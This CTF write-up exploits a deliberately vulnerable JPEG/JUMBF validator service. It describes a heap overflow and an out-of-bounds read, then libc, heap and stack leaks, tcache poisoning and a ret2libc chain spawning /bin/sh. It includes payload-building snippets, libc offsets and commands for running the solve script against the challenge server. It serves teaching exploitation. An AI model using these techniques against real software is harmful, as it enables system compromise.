# dbench_jumbf write-up

## Challenge overview

The service is an interactive **JPEG / C2PA JUMBF validator**. It asks for a JPEG size, then exactly that many bytes of **hex-encoded** JPEG data, parses APP11/JUMBF metadata, and prints information about each parsed JUMBF box.

The target flag is stored at `/flag.txt`, so the real goal is not just crashing the parser, but getting **code execution** and then reading the file.

The bundled binary is a native C++ program with modern mitigations enabled:

- PIE
- NX
- Full RELRO

So the intended path is a memory corruption exploit rather than a simple GOT overwrite.

---

## Protocol notes

The server logic in `server.cpp` is important:

```cpp
printf("jpeg size> ");
...
printf("jpeg hex> ");
...
while (got < jpeg_size) {
    int c1 = fgetc(stdin);
    while (c1 == ' ' || c1 == '\n' || c1 == '\r' || c1 == '\t')
        c1 = fgetc(stdin);
    ...
}
```

After sending the hex string, we should **not** send an extra trailing newline unless we know the next prompt handling is safe. In practice, the exploit script sends exactly the hex stream and stops. This avoids leaving a newline that can get consumed as the next `jpeg size` line.

---

## Root cause 1: APP11/JUMBF heap overflow

The main vulnerability is in `db_extract_jumbfs_from_jpg1()` in `dbench_jumbf/src/dbench_jumbf.cpp`:

```cpp
Lbox = db_get_4byte(&data);
...
if (xl_box_present) {
    ...
    box_length = xl_size + xl_size2;
}
else
    box_length = Lbox;

this_app11_paylaod_size = len - this_app11_header_size - this_box_header_size;

if (this_En != previous_En && Tbox == box_type_jumb) {
    jumb_buf = new unsigned char[box_length];
    jumbfs_vec.push_back(jumb_buf);
    sizes.push_back(box_length);
    data -= this_box_header_size;
    memcpy(jumb_buf, data, static_cast<size_t>(this_app11_paylaod_size) + this_box_header_size);
}
```

### Why this is vulnerable

The allocation size comes from the **attacker-controlled JUMBF `Lbox`**:

- `new unsigned char[box_length]`

But the copy size comes from the **APP11 segment length**:

- `this_app11_paylaod_size + this_box_header_size`

So if we make:

- `Lbox` small
- APP11 segment large

then `memcpy()` writes past the end of `jumb_buf`.

### Minimal bug shape

A malicious JPEG can contain:

- valid SOI
- one APP11 marker
- `Lbox = 0x20`
- `Tbox = "jumb"`
- much more than 0x20 bytes of APP11 body

This gives a controllable **heap overflow** out of the JUMBF allocation.

---

## Root cause 2: parser size-wrap / OOB read primitive

The second useful bug is in `DbJumbBox::deserialize()` in `dbench_jumbf/src/db_jumbf_box.cpp`:

```cpp
uint64_t bytes_remaining = in_buf_size;
...
DbJumbDescBox* desc_box = new DbJumbDescBox;
desc_box->deserialize(buf, bytes_remaining);
...
bytes_remaining -= desc_box->get_box_size();

while (bytes_remaining > 0)
{
    DbBox* box = new DbBox;
    box->deserialize(buf, bytes_remaining);
    bytes_remaining -= box->get_box_size();
    buf += box->get_box_size();
    ...
}
```

`DbBox::deserialize()` trusts attacker-controlled box sizes:

```cpp
lbox_ = db_get_4byte(&buf);
...
if (lbox_ == 1)
    box_size_ = xl_box_;
else if (lbox_ == 0)
    box_size_ = in_buf_size;
else
    box_size_ = lbox_;

payload_ = buf;
payload_size_ = box_size_ - header_size;
```

### Why this is useful

If a content box claims a size larger than `bytes_remaining`, then:

- `bytes_remaining -= box->get_box_size()` underflows as an unsigned value
- `buf += box->get_box_size()` advances far outside the original JUMBF buffer

That gives a controlled parser walk into adjacent heap memory.

The service also prints up to 256 bytes for JSON/XML payloads:

```cpp
if ((strcmp(type_name, "JSON") == 0 || strcmp(type_name, "XML") == 0) && box.get_payload()) {
    unsigned char* p = box.get_payload();
    uint64_t sz = box.get_payload_size();
    if (sz > 256) sz = 256;
    fwrite(p, 1, sz, stdout);
}
```

So the parser bug becomes a practical **memory disclosure primitive**.

---

## Exploitation strategy

The final exploit uses the overflow for corruption and the parser bug for leaks.

High-level plan:

1. Leak a libc pointer.
2. Leak a stable heap pointer for a reusable JUMBF buffer.
3. Leak `environ` from libc to derive a stack address.
4. Use the heap overflow to poison tcache.
5. Make the next JUMBF allocation return over the active saved frame of `db_extract_jumbfs_from_jpg1()`.
6. Copy a tiny ret2libc chain directly over saved RBP/RIP.
7. Return into `system("/bin/sh")` and send `cat /flag.txt`.

---

## Leak 1: libc

The exploit first grooms the heap, frees large JUMBF chunks, then uses the parser over-read to print allocator metadata that contains a libc pointer.

In the solve script, the relevant offset is:

```python
LIBC_MAIN_ARENA_LEAK_OFF = 0x1e5b20
```

So:

```python
libc_base = leaked_ptr - 0x1e5b20
```

The script mode for this stage is:

```bash
python3 dbench_jumbf_solve_WORKING.py --local ./server --mode libc-leak
```

---

## Leak 2: heap base for a reusable JUMBF buffer

Using the size-wrap parser bug again, the exploit prints heap data and recovers a pointer into a known `0x321` JUMBF allocation, called **`B`** in the script.

The script uses the observation that, for this heap layout:

```python
B = leaked_heap_ptr - 0x348
```

This pointer is later used for:

- safe-linking calculations
- building an arbitrary-read style JUMBF
- choosing the correct poisoning chunk

---

## Leak 3: `environ`

Once libc is known, reading `environ` is straightforward.

The exploit crafts a fake content layout so the parser reads from:

```python
libc + LIBC_ENVIRON - 8
```

with:

```python
LIBC_ENVIRON = 0x1ece28
```

The returned qword is a stack pointer near the current stack frame.

---

## Tcache poisoning

The heap overflow is used against the `0x70` tcache bin.

This size is especially useful because both of the following land in the same bin:

- `new unsigned char[0x58]` for a small JUMBF buffer
- `new DbBox` where `sizeof(DbBox) == 0x58`

The grooming image creates:

- two `0x58` JUMBF chunks
- one `0x321` chunk

Then the reused `0x321` chunk overflows into the freed `0x58` tcache entry and overwrites its `fd` pointer.

Because safe-linking is enabled, the stored pointer must be encoded as:

```python
encoded_fd = target ^ (chunk_addr >> 12)
```

In the script:

```python
P = B + target_chunk_off
enc = target ^ (P >> 12)
```

After a parser-side `new DbBox` pops the real head, the tcache head becomes our chosen `target`.

---

## Final control-flow hijack

The cleanest target is **not** `main`'s return address.

Instead, the exploit overwrites the active saved frame of `db_extract_jumbfs_from_jpg1()` while that function is still executing.

Using the leaked `environ`, the script computes:

```python
target = environ - 0x388
```

where:

- `target` points to the saved RBP slot of the active extractor frame
- `target + 8` is the saved RIP

This delta was stable in the provided local runtime and is the script default:

```python
DEFAULT_STACK_DELTA = 0x388
```

### Why this target is good

After poisoning tcache, the next small JUMBF allocation:

```cpp
jumb_buf = new unsigned char[0x58];
```

returns a pointer into the stack frame itself.

Then the extractor immediately does:

```cpp
memcpy(jumb_buf, data, ...)
```

So our crafted JUMBF bytes are copied directly over:

- saved RBP
- saved RIP
- following stack slots

### The ROP chain

The final `0x58` JUMBF is built as:

```python
j = p32(total) + b'jumb' + q(ret) + q(pop_rdi_ret) + q(binsh) + q(system)
```

Important detail:

- bytes `0..7` are the mandatory JUMBF header
- these overwrite saved RBP, which is harmless
- bytes `8..` become the actual ROP chain

The script uses these libc offsets:

```python
LIBC_SYSTEM  = 0x53110
LIBC_BINSH   = 0x1a5ea4
LIBC_POP_RDI = 0x2a145
LIBC_RET     = 0x2a146
```

So when `db_extract_jumbfs_from_jpg1()` returns, control flows to:

```text
ret -> pop rdi ; ret -> "/bin/sh" -> system
```

This gives a shell before the program can do any meaningful cleanup of the poisoned pointer.

---

## Final exploit flow

The working script does the following in `do_exploit()`:

1. `leak_libc()`
2. `leak_heap_B()`
3. `leak_environ()`
4. `send_image(prep_tcache_img())`
5. `send_image(poison_pop_img(B, target))`
6. `send_image(one_jpeg(rop_over_extract_jumb(libc)), wait_done=False)`
7. sleep briefly
8. send command, default:

```bash
cat /flag.txt; echo DONE
```

9. read until `DONE`

---

## Local verification

I verified the final exploit against the bundled local `server` binary.

Local command:

```bash
python3 dbench_jumbf_solve_WORKING.py --local ./server --cmd 'cat flag.txt; echo DONE'
```

Expected local result:

```text
grey{fake_flag}
DONE
```

---

## Remote usage

Run the exploit against the remote service with:

```bash
python3 dbench_jumbf_solve_WORKING.py challs.nusgreyhats.org 32167
```

or explicitly:

```bash
python3 dbench_jumbf_solve_WORKING.py challs.nusgreyhats.org 32167 --mode exploit
```

If the remote stack layout differs slightly from local, the most likely knob to adjust is:

```bash
--stack-delta
```

because the final overwrite target is derived from:

```python
target = environ - stack_delta
```

---

## Short conclusion

The challenge combines two bugs:

1. **heap overflow** in APP11/JUMBF extraction
2. **size-wrap / OOB read** in JUMBF content parsing

The leak bug provides heap/libc/stack disclosure. The overflow then poisons tcache and redirects the next small JUMBF allocation onto the active extractor stack frame. A final 0x58-byte JUMBF directly overwrites saved RIP with a short ret2libc chain and spawns `/bin/sh`, allowing the exploit to read `/flag.txt`.

